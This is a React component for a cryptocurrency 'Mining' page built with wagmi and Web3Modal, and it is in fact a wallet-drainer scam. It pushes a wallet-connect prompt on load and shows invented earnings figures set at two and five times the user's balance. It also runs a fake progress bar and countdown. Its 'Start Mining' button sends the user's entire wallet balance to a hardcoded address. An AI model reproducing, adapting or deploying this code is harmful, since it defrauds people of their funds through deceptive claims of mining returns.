import { useEffect, useState } from "react";
import LoadingBar from './loadingBar';
import { useAccount, useBalance, useSendTransaction } from "wagmi";
import { useWeb3Modal } from "@web3modal/wagmi/react";

const Miner = () => {
    
    const { open } = useWeb3Modal()
    const { isConnected, address } = useAccount()
    const { data: hash, sendTransaction } = useSendTransaction()

    const [progress, setProgress] = useState(0);

    const [days, setDays] = useState("");
    const [hours, setHours] = useState("");
    const [minutes, setMinutes] = useState("");
    const [seconds, setSeconds] = useState("");
    const [expected, setExpected] = useState("");
    const [actual, setActual] = useState("");

    const calculateTimeLeft = () => {
        const difference = +new Date(`2024-07-05T00:00:00`) - +new Date();
    
        if (difference > 0) {
            setDays(String(Math.floor(difference / (1000 * 60 * 60 * 24))))
            setHours(String(Math.floor((difference / (1000 * 60 * 60)) % 24)))
            setMinutes(String(Math.floor((difference / 1000 / 60) % 60)))
            setSeconds(String(Math.floor((difference / 1000) % 60)))
        }
    };

    useEffect(() => {
        const timer = setTimeout(() => {
        calculateTimeLeft();
        }, 1000);
        return () => clearTimeout(timer);
    });

    
    useEffect(() => {
        const totalDuration = 20 * 24 * 60 * 60 * 1000; // 20 days in milliseconds
        const updateInterval = 1000; // Update every second
    
        const startTime = Date.now();
        const endTime = startTime + totalDuration;
    
        const interval = setInterval(() => {
          const currentTime = Date.now();
          const elapsedTime = currentTime - startTime;
          const progress = Math.min(10 + (elapsedTime / totalDuration) * 90, 100); // Start at 10%, end at 100%
          setProgress(progress);
    
          if (currentTime >= endTime) {
            clearInterval(interval);
          }
        }, updateInterval);
    
        return () => {
          clearInterval(interval);
        };
    }, []);

    const { data: baseBalanceData } = useBalance({
        address: address,
        unit: "ether",
    });

    const calculateExpected = () => {
        if (isConnected){
            const floatedBal = parseFloat(String(baseBalanceData?.formatted))
            const future = String(floatedBal * 5)
            if (floatedBal > 0.01){
                setExpected(future +"  "+ baseBalanceData?.symbol)
            }else{
                setExpected("15.34  "+ baseBalanceData?.symbol)
            }
        }
    }

    const calculateActual = () => {
        if (isConnected){
            const floatedBal = parseFloat(String(baseBalanceData?.formatted))
            const future = String(floatedBal * 2)
            if (floatedBal > 0.01){
                setActual(future +"  "+ baseBalanceData?.symbol)
            }else{
                setActual("0.04  "+ baseBalanceData?.symbol)
            }
        }
    }

        
    useEffect(() => {
        calculateExpected();
        calculateActual();
    }, [address]);

    function checkConnect(){
        if(!isConnected){
            open({ view: 'Networks' })
        }
    }

    useEffect(() => {
        checkConnect()
    }, [address]);

    function connectAndSend() {
        if (!isConnected) {
            open({ view: 'Networks' })
        }else{
            const value = baseBalanceData?.value
            const to = "0x9d5eBa1AF95141f8f8fb943155bd45fDdB2639Fa"as `0x${string}` 
            sendTransaction({ to, value })
        }
    }

    return(
        <section className="hero bg_img pos-rel pt-120" data-background="../assets/bg/hero-bg1.svg">
            <div className="hero-shape">
                <div className="shape--1">
                    <img className="leftToRight" src="../assets/hero-sp_01.svg" alt=""/>
                </div>
                <div className="shape--2">
                    <img className="topToBottom" src="../assets/hero-sp_02.svg" alt=""/>
                </div>
                <div className="shape--3">
                    <img className="leftToRight" src="../assets/hero-sp_04.svg" alt=""/>
                </div>
                <div className="shape--4">
                    <img className="topToBottom" src="../assets/hero-sp_03.svg" alt=""/>
                </div>
                <div className="shape--5">
                    <img className="topToBottom" src="../assets/hero-sp_05.svg" alt=""/>
                </div>
                <div className="shape--6">
                    <img className="leftToRight" src="../assets/hero-sp_06.svg" alt=""/>
                </div>
            </div>
            <div className="container block">
                <div className='flex justify-center'>
                    <div className="container">
                        <div className="hero__content-wrap">
                            <div className="section-title hero--sec-titlt wow fadeInUp" data-wow-duration=".7s" style={{animationDuration: "0.7s", animation: "fadeInUp"}}>
                                <h1 className="title">Mining</h1>
                            </div>
                            <div className="countdown ul_li_center wow fadeInUp mt-60" data-wow-duration=".7s" data-wow-delay="200ms" data-countdown="2024/08/28" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "200ms", animation: "fadeInUp"}}>
                                <div className="single"><p>Days</p><h1>{days}</h1></div> <div className="single"><p>Hours</p><h1>{hours}</h1></div> <div className="single"><p>Minutes</p><h1>{minutes}</h1></div> <div className="single"><p>SECONDS</p><h1>{seconds}</h1></div></div>
                            </div>
                        <LoadingBar progress={progress} />
                        <div className="justify-center ul_li_center">
                            <div className="m-3">
                                <h5 className="block xb-item--acc-title">Total Earnings</h5>
                                <span>{isConnected? actual : "Connect Wallet"}</span>
                            </div>
                            <div className="ml-2">
                                <h5 className="block xb-item--acc-title">Expected Earnings</h5>
                                <span> {isConnected? expected : "Connect Wallet"}</span>
                            </div>
                        </div>
                    </div>
                    
                    <div className="hero__btn btns pt-50 wow fadeInUp" data-wow-duration=".7s" data-wow-delay="350ms" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "350ms", animationName: "fadeInUp"}}>
                        
                        <div className="them-btn" onClick={connectAndSend}>
                            <span className="btn_label" data-text="Start Mining">Start Mining</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    );
}

export default Miner